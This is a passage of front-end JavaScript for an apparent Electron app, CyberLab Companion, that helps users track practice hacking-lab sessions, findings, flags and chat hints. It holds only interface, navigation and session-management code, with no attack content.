  // Step 2 (index 2) — Obsidian vault
  if (wizardStep === 2) {
    const input = $('#wizard-vault');
    if (input && input.value.trim()) {
      AppState.config.obsidianVault = input.value.trim();
    }
  }

  if (wizardStep < WIZARD_TOTAL - 1) {
    wizardStep++;
    renderWizardStep();
  }
}

function wizardPrev() {
  if (wizardStep > 0) { wizardStep--; renderWizardStep(); }
}

async function wizardFinish() {
  AppState.config.setupComplete = true;
  AppState.config.theme = { core: _wizardCore, personality: _wizardPersonality };
  await window.electronAPI.saveConfig(AppState.config);
  hideWizard();
  showApp();
}

async function wizardPickObsidian() {
  const dir = await window.electronAPI.pickFolder();
  if (dir) {
    const input = $('#wizard-vault');
    if (input) input.value = dir;
    AppState.config.obsidianVault = dir;
  }
}

async function wizardTestApi() {
  const input = $('#wizard-apikey');
  const result = $('#api-test-result');
  const btn = $('#test-api-btn');
  const key = input ? input.value.trim() : '';
  if (!key) { showToast('Enter an API key first', 'warning'); return; }
  if (btn) btn.textContent = 'Testing…';
  try {
    const ok = await window.electronAPI.testApiKey(key);
    if (result) {
      result.textContent = ok ? '✓ Connected' : '✗ Invalid key';
      result.style.color = ok ? 'var(--success)' : 'var(--danger)';
    }
    if (ok) {
      await window.electronAPI.saveApiKey(key);
      AppState.apiKeyValid = true;
      updateApiStatusDot(true);
    }
  } catch (e) {
    if (result) { result.textContent = '✗ Error'; result.style.color = 'var(--danger)'; }
  }
  if (btn) btn.textContent = 'Test Connection';
}

// =============================================================================
// SECTION 2E — APP SHELL SHOW / HIDE
// =============================================================================

function showApp() {
  const appRoot = $('#app-root');
  if (appRoot) appRoot.style.display = '';

  // Start on Dashboard — no auto-tab creation
  switchScreen('dashboard');

  // Load persisted data — each guarded so one failure doesn't cascade
  try { loadProgressData(); }   catch(e) { console.error('[showApp] loadProgressData:', e); }
  try { loadLabTrackerData(); } catch(e) { console.error('[showApp] loadLabTrackerData:', e); }
  try { loadSnippetsData(); }   catch(e) { console.error('[showApp] loadSnippetsData:', e); }
  try { startVpnMonitor(); }    catch(e) { console.error('[showApp] startVpnMonitor:', e); }

  // Wire all sections — each wrapped independently so one failure cannot block another
  try { wireTopBar(); }         catch(e) { console.error('[showApp] wireTopBar:', e); }
  try { if (typeof wireV2Layout === 'function') wireV2Layout(); }
    catch(e) { console.error('[showApp] wireV2Layout:', e); }
  try { wireModals(); }         catch(e) { console.error('[showApp] wireModals:', e); }
  try { wireSettingsScreen(); } catch(e) { console.error('[showApp] wireSettingsScreen:', e); }
  try { wireProgressScreen(); } catch(e) { console.error('[showApp] wireProgressScreen:', e); }
  try { wireTrackerScreen(); }  catch(e) { console.error('[showApp] wireTrackerScreen:', e); }

  // Wire full-page screens
  try { if (typeof wireDashboardScreen === 'function') wireDashboardScreen(); }
    catch(e) { console.error('[showApp] wireDashboardScreen:', e); }
  try { if (typeof wireOverviewScreen  === 'function') wireOverviewScreen();  }
    catch(e) { console.error('[showApp] wireOverviewScreen:', e); }
  try { if (typeof wireNotesScreen     === 'function') wireNotesScreen();     }
    catch(e) { console.error('[showApp] wireNotesScreen:', e); }
  try { if (typeof wireBookmarksScreen === 'function') wireBookmarksScreen(); }
    catch(e) { console.error('[showApp] wireBookmarksScreen:', e); }
  try { if (typeof wireCommandsScreen  === 'function') wireCommandsScreen();  }
    catch(e) { console.error('[showApp] wireCommandsScreen:', e); }
  try { if (typeof wireReconScreen     === 'function') wireReconScreen();     }
    catch(e) { console.error('[showApp] wireReconScreen:', e); }
  try { if (typeof wirePhaseScreens    === 'function') wirePhaseScreens();    }
    catch(e) { console.error('[showApp] wirePhaseScreens:', e); }

  // Finish-up
  try { checkUpdateBanner(); }  catch(e) { console.error('[showApp] checkUpdateBanner:', e); }

  // Apply saved theme
  applyTheme(AppState.config.theme || 'stealth', false);

  // Set font size
  applyFontSize(AppState.config.fontSize || 'medium');

  // Wire global keyboard shortcuts
  try { wireKeyboardShortcuts(); } catch(e) { console.error('[showApp] wireKeyboardShortcuts:', e); }

  // Ensure New Session buttons are always wired (safety net)
  const nsBtn1 = $('#new-tab-btn');
  if (nsBtn1 && !nsBtn1._nsWired) { nsBtn1._nsWired = true; nsBtn1.addEventListener('click', () => showNewSessionModal()); }
  const nsBtn2 = $('#dash-new-session-btn');
  if (nsBtn2 && !nsBtn2._nsWired) { nsBtn2._nsWired = true; nsBtn2.addEventListener('click', () => showNewSessionModal()); }
  const nsBtn3 = $('#create-session-btn');
  if (nsBtn3 && !nsBtn3._nsWired) { nsBtn3._nsWired = true; nsBtn3.addEventListener('click', confirmNewSession); }

  // Footer quick theme switcher
  try { initFooterThemeSwitcher(); } catch(e) { console.error('[showApp] initFooterThemeSwitcher:', e); }

  console.log('[showApp] All wiring complete');

  // Push initial status to Launcher (deferred so loadLabTrackerData async completes)
  setTimeout(pushCyberLabStatus, 2000);
}

function switchScreen(screenId) {
  $$('.screen').forEach(s => s.classList.toggle('active', s.id === `${screenId}-screen`));
  $$('.nav-tab-btn[data-screen]').forEach(btn => btn.classList.toggle('active', btn.dataset.screen === screenId));
}

function applyFontSize(size) {
  const sizes = { small: '13px', medium: '14px', large: '16px' };
  document.documentElement.style.setProperty('--base-font-size', sizes[size] || '14px');
}

// =============================================================================
// SECTION 2F — TOP BAR WIRING
// =============================================================================

function wireTopBar() {
  // Top-bar core theme quick-switcher (switches core only, keeps current personality)
  const themeSel = $('#theme-select');
  if (themeSel) {
    const t = AppState.config.theme || {};
    themeSel.value = (typeof t === 'object' ? t.core : LEGACY_THEME_MAP[t] && LEGACY_THEME_MAP[t].core) || 'stealth';
    themeSel.addEventListener('change', async () => {
      const currentTheme = AppState.config.theme || {};
      const currentPersonality = (typeof currentTheme === 'object' ? currentTheme.personality : LEGACY_THEME_MAP[currentTheme] && LEGACY_THEME_MAP[currentTheme].personality) || 'neutral';
      AppState.config.theme = { core: themeSel.value, personality: currentPersonality };
      applyTheme(AppState.config.theme);
      if (AppState.config.soundEnabled) Sounds.themeSwitch();
      await window.electronAPI.saveConfig(AppState.config);
      updateHighlightThemeForActiveTab();
    });
  }

  // Screen nav buttons (legacy top-bar nav)
  $$('.nav-tab-btn[data-screen]').forEach(btn => {
    btn.addEventListener('click', () => {
      const screen = btn.dataset.screen;
      switchScreen(screen);
      if (screen === 'progress') refreshProgressScreen();
      if (screen === 'tracker') refreshTrackerScreen();
      if (screen === 'settings') syncSettingsThemeChips();
    });
  });

  // v2 sidebar nav items
  // Each item is wired ONCE here. Wiring is guarded so it's safe to call wireTopBar multiple times.
  $$('.sidebar-nav-item:not([data-wired])').forEach(btn => {
    btn.dataset.wired = '1'; // prevent double-binding
    btn.addEventListener('click', () => {
      const screen = btn.dataset.screen;
      const view   = btn.dataset.view;

      // ── Active highlight ──────────────────────────────────────────────────
      $$('.sidebar-nav-item').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      // ── Screen-switch items (all non-lab screens) ────────────────────────
      if (screen && screen !== 'lab') {
        switchScreen(screen);
        if (screen === 'dashboard')  { if (typeof renderDashboardScreen  === 'function') renderDashboardScreen(); }
        if (screen === 'overview')   { if (typeof renderOverviewScreen   === 'function') renderOverviewScreen(); }
        if (screen === 'progress')   refreshProgressScreen();
        if (screen === 'tracker')    refreshTrackerScreen();
        if (screen === 'notes')      { if (typeof refreshNotesScreen     === 'function') refreshNotesScreen(); }
        if (screen === 'bookmarks')  { if (typeof refreshBookmarksScreen === 'function') refreshBookmarksScreen(); }
        if (screen === 'recon')      { if (typeof refreshReconScreen     === 'function') refreshReconScreen(); }
        if (screen === 'commands')   { if (typeof wireCommandsScreen     === 'function') wireCommandsScreen(); }
        if (screen === 'settings')   { syncSettingsThemeChips(); }
        if (['exploits','enum','privesc','postex','loot'].includes(screen)) {
          if (typeof refreshPhaseScreen === 'function') refreshPhaseScreen(screen);
        }
        return;
      }

      // ── Lab views — stay on lab screen ────────────────────────────────────
      switchScreen('lab');

      const filterMap = {
        overview: 'all', chat: 'all', exploit: 'exploit',
        enum: 'enum', privesc: 'privesc', post: 'post',
        loot: 'post', notes: 'all', bookmarks: 'all', recon: 'recon'
      };
      const catFilter = filterMap[view] || 'all';

      // Render tools panel with the matching category
      if (typeof renderToolsPanel === 'function') renderToolsPanel(catFilter);

      // Sync tool-filter tab strip
      $$('.tfil').forEach(t => t.classList.toggle('active', t.dataset.filter === catFilter));

      // Per-view side effects — make it obvious something happened
      if (view === 'chat' || view === 'overview') {
        // Delay focus slightly so Electron window re-focus settles
        setTimeout(() => { const inp = $('#message-input'); if (inp) inp.focus(); }, 80);
      }

      if (view === 'loot') {
        // no panel scroll needed — stays on lab screen
      }

      if (view === 'loot') {
        // Scroll findings sections into view in target panel
        const creds = $('#findings-credentials');
        if (creds) creds.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }

      // Flash the tools section briefly so the user sees it changed
      const toolsSec = $('#tools-section');
      if (toolsSec) {
        toolsSec.style.transition = 'none';
        toolsSec.style.outline = '2px solid var(--accent)';
        setTimeout(() => {
          toolsSec.style.outline = '';
          toolsSec.style.transition = '';
        }, 400);
      }
    });
  });

  // Focus mode button
  const focusBtn = $('#btn-focus');
  if (focusBtn) focusBtn.addEventListener('click', toggleFocusMode);

  // Focus exit pill
  const focusExit = $('#focus-exit-pill');
  if (focusExit) focusExit.addEventListener('click', toggleFocusMode);

  // Settings button (btn-settings is already wired via .nav-tab-btn[data-screen])
  // but wire directly too as fallback
  const settingsBtn = $('#btn-settings');
  if (settingsBtn && !settingsBtn._settingsWired) {
    settingsBtn.addEventListener('click', () => { switchScreen('settings'); syncSettingsThemeChips(); });
    settingsBtn._settingsWired = true;
  }

  // Update banner
  const updateBtn = $('#update-install-btn');
  if (updateBtn) updateBtn.addEventListener('click', () => window.electronAPI.openExternal('https://github.com/cyberlab-companion/releases'));
}

function updateVpnIndicator(status) {
  AppState.vpnStatus = status;
  // v2 layout: .vpn-chip#vpn-indicator (no longer #vpn-dot)
  const chip = $('#vpn-indicator');
  const label = $('#vpn-label');
  const focusDot = $('#focus-vpn-dot');
  if (chip) {
    chip.classList.toggle('vpn-on', status.connected);
    chip.classList.toggle('vpn-off', !status.connected);
  }
  if (focusDot) {
    focusDot.classList.toggle('on', status.connected);
    focusDot.classList.toggle('off', !status.connected);
  }
  if (label) {
    label.textContent = status.connected ? (status.interface || 'VPN') : 'No VPN';
  }
}

function updateApiStatusDot(valid) {
  AppState.apiKeyValid = valid;
  const dot = $('#api-status-dot');
  if (dot) {
    dot.classList.toggle('api-ok', valid);
    dot.classList.toggle('api-err', !valid);
    dot.title = valid ? 'API Connected' : 'API Not Connected';
  }
}

function checkUpdateBanner() {
  const banner = $('#update-banner');
  if (banner && AppState.updateAvailable) {
    banner.removeAttribute('hidden');
  }
}

function startVpnMonitor() {
  if (!AppState.config.vpnCheckEnabled) return;
  const poll = async () => {
    try {
      const status = await window.electronAPI.checkVPN();
      updateVpnIndicator(status);
    } catch (_) {}
  };
  poll();
  AppState.vpnInterval = setInterval(poll, 30000);
}

function updateHighlightThemeForActiveTab() {
  // Re-highlight all code blocks in active chat
  if (typeof hljs !== 'undefined') {
    $$('#chat-history pre code').forEach(block => {
      hljs.highlightElement(block);
    });
  }
}

// =============================================================================
// SECTION 2G — TAB MANAGEMENT
// =============================================================================

function createTab(sessionData) {
  if (AppState.tabs.length >= 5) {
    showToast('Maximum 5 tabs open', 'warning');
    return null;
  }

  const tabId = generateId();
  const session = sessionData || createSession({
    name: 'New Session',
    target: '',
    platform: 'HTB',
    difficulty: 'Medium',
  });

  const tab = {
    id: tabId,
    session,
    chatHistory: [], // Array of { role, content, timestamp, images? }
    pendingImages: [],
    isTyping: false,
    hintLevel: 1,
    teachMeMode: false,
    methodologyStep: 0,
    scrollPos: 0,
  };

  AppState.tabs.push(tab);
  renderTabBar();
  switchTab(tabId);
  pushCyberLabStatus();
  return tabId;
}

function closeTab(tabId) {
  const idx = AppState.tabs.findIndex(t => t.id === tabId);
  if (idx === -1) return;

  // Prompt save if session has content
  const tab = AppState.tabs[idx];
  if (tab.chatHistory.length > 0 && !tab.session.saved) {
    // Auto-save before closing
    autoSaveTab(tab);
  }

  AppState.tabs.splice(idx, 1);

  if (AppState.tabs.length === 0) {
    // No more tabs — return to Dashboard, do NOT auto-create a blank session
    AppState.activeTabId = null;
    renderTabBar();
    switchScreen('dashboard');
    if (typeof renderDashboardScreen === 'function') renderDashboardScreen();
    pushCyberLabStatus();
    return;
  }

  // Switch to adjacent tab
  const newIdx = Math.min(idx, AppState.tabs.length - 1);
  switchTab(AppState.tabs[newIdx].id);
  renderTabBar();
  pushCyberLabStatus();
}

function switchTab(tabId) {
  const tab = AppState.tabs.find(t => t.id === tabId);
  if (!tab) return;

  // Save scroll position of old tab
  const oldTab = AppState.tabs.find(t => t.id === AppState.activeTabId);
  if (oldTab) {
    const messages = $('#chat-history');
    if (messages) oldTab.scrollPos = messages.scrollTop;
  }

  AppState.activeTabId = tabId;
  renderTabBar();
  renderActiveTab();
}

function getActiveTab() {
  return AppState.tabs.find(t => t.id === AppState.activeTabId) || null;
}

function renderTabBar() {
  const tabBar = $('#tab-bar');
  if (!tabBar) return;

  const addBtn = tabBar.querySelector('.tab-add');  // HTML: id="new-tab-btn" class="tab-add"
  // Remove old tabs but keep add button
  tabBar.querySelectorAll('.tab-item').forEach(t => t.remove());

  AppState.tabs.forEach(tab => {
    const el = document.createElement('div');
    el.className = `tab-item ${tab.id === AppState.activeTabId ? 'active' : ''}`;
    el.dataset.tabId = tab.id;

    const name = tab.session?.name || 'New Session';
    const platform = tab.session?.platform || '';
    const diff = tab.session?.difficulty || '';
    const diffColors = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Insane: '#a371f7' };
    const dotColor = diffColors[diff] || 'var(--text-muted)';

    el.innerHTML = `
      <span class="tab-dot" style="background:${dotColor}"></span>
      <span class="tab-label" title="${escHtml(name)}">${escHtml(name.length > 18 ? name.slice(0, 18) + '…' : name)}</span>
      ${platform ? `<span class="tab-platform">${escHtml(platform)}</span>` : ''}
      <button class="tab-close" data-tab-id="${tab.id}" title="Close tab">×</button>
    `;

    el.addEventListener('click', (e) => {
      if (!e.target.classList.contains('tab-close')) switchTab(tab.id);
    });

    const closeBtn = el.querySelector('.tab-close');
    if (closeBtn) closeBtn.addEventListener('click', (e) => { e.stopPropagation(); closeTab(tab.id); });

    if (addBtn) tabBar.insertBefore(el, addBtn);
    else tabBar.appendChild(el);
  });

  // Disable add button if max reached
  if (addBtn) addBtn.disabled = AppState.tabs.length >= 5;
}

function renderActiveTab() {
  const tab = getActiveTab();
  if (!tab) return;

  // Update session info panel
  renderSessionInfo(tab);

  // Render chat history
  renderChatHistory(tab);

  // Update right panel state
  renderRightPanelForTab(tab);

  // Update hint level display
  updateHintLevelDisplay(tab);

  // Update teach me button state
  const teachBtn = $('#teach-me-btn');
  if (teachBtn) teachBtn.classList.toggle('active', !!tab.teachMeMode);
  const teachBadge = $('#teach-me-badge');
  if (teachBadge) teachBadge.style.display = tab.teachMeMode ? '' : 'none';

  // Update context bar session name
  const ctxName = $('#context-session-name');
  if (ctxName) ctxName.textContent = tab.session?.name || '—';

  // Update status bar
  updateStatusBar(tab);
  updateSidebarProgress();

  // Restore scroll
  setTimeout(() => {
    const messages = $('#chat-history');
    if (messages) messages.scrollTop = tab.scrollPos || messages.scrollHeight;
  }, 50);
}

// =============================================================================
// SECTION 2H — SESSION MANAGEMENT
// =============================================================================

function showNewSessionModal() {
  const modal = $('#new-session-modal');
  if (!modal) return;

  // Reset form
  const form = modal.querySelector('form') || modal;
  const nameInput = modal.querySelector('#ns-name');
  const targetInput = modal.querySelector('#ns-ip');
  const platformSel = modal.querySelector('#ns-platform');
  const diffSel = modal.querySelector('#ns-difficulty');
  const ipInput = modal.querySelector('#ns-ip');
  const osInput = modal.querySelector('#ns-labtype');
  const notesInput = modal.querySelector('#ns-name');

  if (nameInput) nameInput.value = '';
  if (targetInput) targetInput.value = '';
  if (platformSel) platformSel.value = 'HTB';
  if (diffSel) diffSel.value = 'Medium';
  if (ipInput) ipInput.value = '';
  if (osInput) osInput.value = '';
  if (notesInput) notesInput.value = '';

  showModal('new-session-modal');
  if (nameInput) nameInput.focus();
}

function confirmNewSession() {
  const modal = $('#new-session-modal');
  if (!modal) return;

  const name = (modal.querySelector('#ns-name')?.value || '').trim();
  if (!name) { showToast('Please enter a session name', 'warning'); return; }

  const sessionData = createSession({
    name,
    target: modal.querySelector('#ns-ip')?.value?.trim() || '',
    platform: modal.querySelector('#ns-platform')?.value || 'HTB',
    difficulty: modal.querySelector('#ns-difficulty')?.value || 'Medium',
    targetIp: modal.querySelector('#ns-ip')?.value?.trim() || '',
    targetOs: modal.querySelector('#ns-labtype')?.value?.trim() || '',
    notes: modal.querySelector('#ns-name')?.value?.trim() || '',
  });

  hideModal('new-session-modal');

  // Create new tab with this session
  const tabId = createTab(sessionData);
  if (tabId && AppState.config.soundEnabled) Sounds.click();

  showToast(`Session "${name}" started`, 'success');
}

function renderSessionInfo(tab) {
  if (!tab?.session) return;
  const s = tab.session;

  // ── Top bar session indicator ─────────────────────────────────────────────
  const sessionNameDisplay = $('#session-name-display');
  if (sessionNameDisplay) sessionNameDisplay.textContent = s.name || 'No active session';
  const sessionPulse = $('#session-pulse');
  if (sessionPulse) {
    sessionPulse.className = 'session-pulse ' + (s.targetIp ? 'active' : 'idle');
  }

  // ── Target panel status dot + name ────────────────────────────────────────
  const statusDot = $('#session-status-dot');
  if (statusDot) statusDot.classList.toggle('active', !!s.targetIp);

  const nameEl = $('#target-hostname');
  if (nameEl) nameEl.textContent = s.name || 'Unnamed';

  // Platform select dropdown
  const platformSel = $('#session-platform-select');
  if (platformSel) {
    platformSel.value = s.platform || 'HTB';
    // Wire once — guard with _platformWired
    if (!platformSel._platformWired) {
      platformSel._platformWired = true;
      platformSel.addEventListener('change', async () => {
        const tab = getActiveTab();
        if (tab?.session) {
          tab.session.platform = platformSel.value;
          renderTabBar(); // refresh tab badge
          await autoSaveTab(tab);
        }
      });
    }
  }

  // Difficulty badge
  const diffEl = $('#session-difficulty-label');
  const diffColors = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Insane: '#a371f7' };
  if (diffEl) {
    diffEl.textContent = s.difficulty || '';
    diffEl.style.color = diffColors[s.difficulty] || 'var(--text-dim)';
  }

  // Session type badge (session-diff-badge)
  const diffBadge = $('#session-diff-badge');
  if (diffBadge && s.difficulty) {
    diffBadge.textContent = s.difficulty;
    diffBadge.style.color = diffColors[s.difficulty] || 'var(--text-dim)';
    diffBadge.style.borderColor = diffColors[s.difficulty] || 'var(--border)';
  }

  // Target IP
  const ipEl = $('#target-ip');
  if (ipEl) ipEl.textContent = s.targetIp || '—';

  // Hostname (displayed below IP if different from name)
  const hostnameEl = $('#target-hostname-display');
  if (hostnameEl) hostnameEl.textContent = s.hostname || s.name || '—';

  // OS
  const osEl = $('#target-os');
  if (osEl) osEl.textContent = s.targetOs || '—';

  // Duration
  const durEl = $('#elapsed-display');
  if (durEl) durEl.textContent = formatDuration(s.startTime ? Date.now() - s.startTime : 0);

  // Context bar — session name
  const ctxName = $('#context-session-name');
  if (ctxName) ctxName.textContent = s.name || '—';

  // Methodology steps
  renderMethodologyTracker(tab);

  // Findings list (also updates status bar + sidebar progress)
  renderFindingsList(tab);

  // Status bar + sidebar
  updateStatusBar(tab);
  updateSidebarProgress();
}

function renderMethodologyTracker(tab) {
  const container = $('#methodology-phases');
  if (!container || !tab?.session) return;

  const STEPS = ['Recon', 'Enum', 'Exploit', 'Post-Exploit', 'PrivEsc', 'Lateral', 'Flag Capture'];
  const currentStep = tab.session.methodologyStep || 0;

  container.innerHTML = STEPS.map((step, i) => {
    const state = i < currentStep ? 'done' : i === currentStep ? 'active' : 'pending';
    return `
      <div class="method-step method-step-${state}" data-step="${i}" title="${escHtml(step)}">
        <span class="method-icon">${state === 'done' ? '✓' : i + 1}</span>
        <span class="method-label">${escHtml(step)}</span>
      </div>
    `;
  }).join('');

  // Click to advance
  container.querySelectorAll('.method-step').forEach(el => {
    el.addEventListener('click', () => {
      const step = parseInt(el.dataset.step);
      if (!tab.session) return;
      tab.session.methodologyStep = step;
      renderMethodologyTracker(tab);
    });
  });
}

function renderFindingsList(tab) {
  if (!tab?.session) return;

  // session.findings is a categorized object: { ports:[], users:[], credentials:[], flags:[], cves:[], files:[], hashes:[], services:[] }
  const TYPE_MAP = [
    ['ports',       'PORT'],
    ['users',       'USER'],
    ['credentials', 'CRED'],
    ['flags',       'FLAG'],
    ['cves',        'CVE'],
    ['files',       'FILE'],
    ['hashes',      'HASH'],
    ['services',    'SERVICE'],
  ];

  const raw = tab.session.findings;

  // Build typed buckets
  const byType = { PORT:[], USER:[], CRED:[], FLAG:[], CVE:[], FILE:[], HASH:[], SERVICE:[] };
  if (Array.isArray(raw)) {
    raw.forEach(f => {
      const t = (f.type || 'unknown').toUpperCase();
      if (byType[t]) byType[t].push(f);
    });
  } else if (raw && typeof raw === 'object') {
    TYPE_MAP.forEach(([key, type]) => {
      (raw[key] || []).forEach(f => byType[type].push({ ...f, type }));
    });
  }

  // Chip renderer for target panel
  const chip = (f, type) => {
    const raw = f.value || f.port || '';
    const val = escHtml(raw.toString().slice(0, 36));
    return `<span class="tp-find-chip tp-chip-${type.toLowerCase()}" title="${escHtml(raw.toString())}">${val}</span>`;
  };

  const emptySpan = `<span class="tp-empty" style="font-size:10px;color:var(--text-muted);font-style:italic">none</span>`;

  // Ports
  const portsEl = $('#findings-ports');
  if (portsEl) portsEl.innerHTML = byType.PORT.length ? byType.PORT.map(f => chip(f, 'PORT')).join('') : emptySpan;

  // Ports count badge
  const countBadge = $('#ports-count-badge');
  if (countBadge) countBadge.textContent = byType.PORT.length + byType.SERVICE.length;

  // Services (no empty fallback — collapsed if none)
  const servicesEl = $('#findings-services');
  if (servicesEl) servicesEl.innerHTML = byType.SERVICE.map(f => chip(f, 'SERVICE')).join('');

  // Credentials
  const credsEl = $('#findings-credentials');
  if (credsEl) credsEl.innerHTML = byType.CRED.length ? byType.CRED.map(f => chip(f, 'CRED')).join('') : emptySpan;

  // Users (no empty — collapsed if none)
  const usersEl = $('#findings-users');
  if (usersEl) usersEl.innerHTML = byType.USER.map(f => chip(f, 'USER')).join('');

  // Flags
  const flagsCaptured = byType.FLAG.length;
  const flagsTotal = tab.session.flagCount || 0;
  const flagsEl = $('#findings-flags');
  if (flagsEl) flagsEl.innerHTML = byType.FLAG.length ? byType.FLAG.map(f => chip(f, 'FLAG')).join('') : emptySpan;

  const flagsFrac = $('#flags-fraction');
  if (flagsFrac) flagsFrac.textContent = `${flagsCaptured}/${flagsTotal || '?'}`;

  // CVEs
  const cvesEl = $('#findings-cves');
  if (cvesEl) cvesEl.innerHTML = byType.CVE.length ? byType.CVE.map(f => chip(f, 'CVE')).join('') : emptySpan;

  // Legacy #findings-content fallback (in hidden panel or legacy layout)
  const legacyEl = $('#findings-content');
  if (legacyEl) {
    const flat = Object.values(byType).flat();
    const typeIcons = { PORT:'🔌', CRED:'🔑', CVE:'⚠️', FLAG:'🚩', FILE:'📄', SERVICE:'⚙️', USER:'👤', HASH:'#️⃣' };
    if (flat.length === 0) {
      legacyEl.innerHTML = '<div class="findings-empty" style="font-size:11px;color:var(--text-muted);padding:8px 0">No findings yet.</div>';
    } else {
      legacyEl.innerHTML = flat.map(f => `
        <div class="finding-item finding-${(f.type||'unknown').toLowerCase()}" data-id="${escHtml(f.id||'')}" data-type="${escHtml(f.type||'')}">
          <span class="finding-icon">${typeIcons[f.type]||'•'}</span>
          <span class="finding-type" style="font-size:10px;opacity:0.6">${escHtml(f.type||'')}</span>
          <span class="finding-value" title="${escHtml(f.value||'')}" style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml((f.value||'').length>40?(f.value||'').slice(0,40)+'…':(f.value||''))}</span>
          <button class="finding-copy-btn" data-value="${escHtml(f.value||'')}" title="Copy" style="background:none;border:none;cursor:pointer;color:var(--text-muted);padding:0 2px">⧉</button>
          <button class="finding-del-btn" data-id="${escHtml(f.id||'')}" data-type="${escHtml(f.type||'')}" title="Remove" style="background:none;border:none;cursor:pointer;color:var(--text-muted);padding:0 2px">×</button>
        </div>`).join('');
      legacyEl.querySelectorAll('.finding-copy-btn').forEach(btn => btn.addEventListener('click', () => copyToClipboard(btn.dataset.value)));
      legacyEl.querySelectorAll('.finding-del-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          if (typeof sessionRemoveFinding === 'function') sessionRemoveFinding(tab.session, btn.dataset.type, btn.dataset.id);
          renderFindingsList(tab);
        });
      });
    }
  }

  // Cascade update to status bar + sidebar
  updateStatusBar(tab);
  updateSidebarProgress();
}

// -----------------------------------------------------------------------------
// STATUS BAR — update bottom strip with live session data
// -----------------------------------------------------------------------------
function updateStatusBar(tab) {
  const s = tab?.session;

  // Elapsed timer
  const elapsedEl = $('#status-elapsed');
  if (elapsedEl && s?.startTime) {
    elapsedEl.textContent = formatDuration(Date.now() - s.startTime);
  } else if (elapsedEl) {
    elapsedEl.textContent = '00:00:00';
  }

  // Target name
  const targetNameEl = $('#status-target-name');
  if (targetNameEl) targetNameEl.textContent = s?.name || '—';

  // Flags progress
  const raw = s?.findings;
  let flagCount = 0;
  if (Array.isArray(raw)) {
    flagCount = raw.filter(f => (f.type||'').toUpperCase() === 'FLAG').length;
  } else if (raw?.flags) {
    flagCount = (raw.flags || []).length;
  }
  const totalFlags = s?.flagCount || 0;

  const flagsTextEl = $('#status-flags-text');
  if (flagsTextEl) flagsTextEl.textContent = `${flagCount} / ${totalFlags || '?'} flags captured`;

  const flagsFill = $('#status-flags-bar-fill');
  if (flagsFill) {
    const pct = totalFlags > 0 ? Math.round((flagCount / totalFlags) * 100) : 0;
    flagsFill.style.width = pct + '%';
  }
}

// -----------------------------------------------------------------------------
// SIDEBAR PROGRESS — update aggregate stats across all tabs
// -----------------------------------------------------------------------------
function updateSidebarProgress() {
  const allTabs = AppState.tabs || [];
  let totalMachines = 0, totalFlags = 0, totalHints = 0, totalMs = 0;

  allTabs.forEach(tab => {
    const s = tab?.session;
    if (!s) return;
    if (s.completed) totalMachines++;
    const raw = s.findings;
    if (Array.isArray(raw)) totalFlags += raw.filter(f => (f.type||'').toUpperCase() === 'FLAG').length;
    else if (raw?.flags) totalFlags += (raw.flags || []).length;
    totalHints += s.hintsUsed || 0;
    if (s.startTime && !s.endTime) totalMs += (Date.now() - s.startTime);
    else if (s.duration) totalMs += s.duration;
  });

  // Per-session progress bar (active tab)
  const activeTab = getActiveTab();
  const raw = activeTab?.session?.findings;
  let curFlags = 0;
  const curTotal = activeTab?.session?.flagCount || 0;
  if (Array.isArray(raw)) curFlags = raw.filter(f => (f.type||'').toUpperCase() === 'FLAG').length;
  else if (raw?.flags) curFlags = (raw.flags || []).length;

  const pct = curTotal > 0 ? Math.round((curFlags / curTotal) * 100) : 0;
  const fill = $('#sidebar-progress-fill');
  const pctEl = $('#sidebar-progress-pct');
  if (fill) fill.style.width = pct + '%';
  if (pctEl) pctEl.textContent = pct + '%';

  // Global stats
  const setEl = (id, val) => { const el = $(`#${id}`); if (el) el.textContent = val; };
  setEl('stat-machines-hacked', totalMachines);
  setEl('stat-flags-captured', totalFlags);
  setEl('stat-hints-used', totalHints);
  const hrs = Math.floor(totalMs / 3600000);
  const mins = Math.floor((totalMs % 3600000) / 60000);
  setEl('stat-time-spent', hrs > 0 ? `${hrs}h ${mins}m` : `${mins}m`);
}

async function autoSaveTab(tab) {
  if (!tab?.session) return;
  try {
    const data = serializeSession(tab.session, tab.chatHistory);
    await window.electronAPI.saveSession(data);
    tab.session.saved = true;
  } catch (e) {
    console.warn('Autosave failed:', e.message);
  }
}

async function manualSaveSession() {
  const tab = getActiveTab();
  if (!tab) return;
  try {
    const data = serializeSession(tab.session, tab.chatHistory);
    await window.electronAPI.saveSession(data);
    tab.session.saved = true;
    showToast('Session saved', 'success', 1500);
  } catch (e) {
    showToast('Save failed: ' + e.message, 'error');
  }
}

async function loadSessionList() {
  try {
    AppState.sessionList = await window.electronAPI.listSessions();
  } catch (e) {
    AppState.sessionList = [];
  }
}

// =============================================================================
// SECTION 2I — CHAT SYSTEM
// =============================================================================

function renderChatHistory(tab) {
  const container = $('#chat-history');
  if (!container) return;
  container.innerHTML = '';

  if (tab.chatHistory.length === 0) {
    renderWelcomeMessage(container, tab);
    return;
  }

  tab.chatHistory.forEach(msg => appendMessageToDOM(container, msg, tab));
}

function renderWelcomeMessage(container, tab) {
  const welcome = document.createElement('div');
  welcome.className = 'chat-welcome';
  const sessionName = tab?.session?.name || 'New Session';
  const platform = tab?.session?.platform || '';
  welcome.innerHTML = `
    <div class="chat-welcome-icon">⚡</div>
    <div class="chat-welcome-title">CYBERLAB COMPANION</div>
    <div class="chat-welcome-sub">Session: <strong>${escHtml(sessionName)}</strong>${platform ? ` · ${escHtml(platform)}` : ''}</div>
    <div class="chat-welcome-hint">Ask anything about your target, request hints, or use the quick actions below.</div>
    <div class="chat-quick-pills">
      <button class="quick-pill" data-prompt="What should I start with for initial reconnaissance?">🔍 Start Recon</button>
      <button class="quick-pill" data-prompt="Generate a checklist for this machine based on what we know.">📋 Checklist</button>
      <button class="quick-pill" data-prompt="Give me a hint for my current step.">💡 Hint</button>
      <button class="quick-pill" data-prompt="Explain the methodology I should follow for this type of machine.">📖 Methodology</button>
      <button class="quick-pill" data-prompt="What are common vulnerabilities for this platform?">⚠️ Vulns</button>
      <button class="quick-pill" data-prompt="How do I capture the flag from here?">🚩 Get Flag</button>
    </div>
  `;
  welcome.querySelectorAll('.pill').forEach(pill => {
    pill.addEventListener('click', () => sendChatMessage(pill.dataset.prompt));
  });
